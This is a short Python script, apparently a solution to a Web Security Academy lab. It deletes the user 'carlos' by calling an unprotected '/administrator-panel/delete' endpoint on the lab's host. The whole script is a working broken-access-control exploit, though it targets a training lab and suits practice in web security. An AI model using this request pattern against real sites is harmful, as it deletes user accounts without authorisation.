# usage:
# python3 1.py \
# --u https://0aaa00a7037819be80f76c960063008a.web-security-academy.net \
# --d carlos

from argparse import ArgumentParser

import requests


def solve(url: str, delete: str) -> None:
    r = requests.get(f"{url.rstrip('/')}/administrator-panel/delete?username={delete}")


def main():
    parser = ArgumentParser()
    parser.add_argument("--u", "--url", dest="url")
    parser.add_argument("--d", "--delete", dest="delete")
    args = parser.parse_args()
    solve(args.url, args.delete)


if __name__ == "__main__":
    main()
